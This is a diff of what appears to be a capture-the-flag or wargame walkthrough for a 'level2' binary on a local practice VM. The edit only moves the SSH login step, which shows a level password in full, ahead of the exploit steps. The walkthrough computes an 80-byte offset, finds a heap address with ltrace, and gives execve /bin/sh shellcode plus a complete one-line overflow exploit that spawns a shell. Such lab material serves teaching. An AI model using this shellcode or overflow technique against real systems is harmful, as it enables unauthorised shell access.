@@ -10,24 +10,24 @@
    - strdup() copies buffer to heap at predictable address
    - EIP offset: 64 (buffer) + 4 (ret_addr) + 8 (padding) + 4 (saved EBP) = 80 bytes
 
-3. Find the heap address using ltrace:
+3. Connect to the VM via SSH:
+   ssh level2@localhost -p 2222
+   Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+4. Find the heap address using ltrace:
    ltrace ./level2
    Input: AAAA
    Observe: strdup("AAAA") = 0x0804a008
 
-4. Use shellcode from Exploit-DB (24 bytes):
+5. Use shellcode from Exploit-DB (24 bytes):
    Source: https://www.exploit-db.com/shellcodes/42428
    Execve("/bin/sh", NULL, NULL) shellcode:
    \x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
 
-5. Calculate exploit structure:
+6. Calculate exploit structure:
    - Shellcode: 24 bytes
    - Padding: 56 bytes (80 - 24 = 56)
    - Return address: 4 bytes (0x0804a008 in little-endian = \x08\xa0\x04\x08)
-
-6. Connect to the VM via SSH:
-   ssh level2@localhost -p 2222
-   Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 
 7. Execute the exploit:
    (python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*56 + "\x08\xa0\x04\x08"'; cat) | ./level2
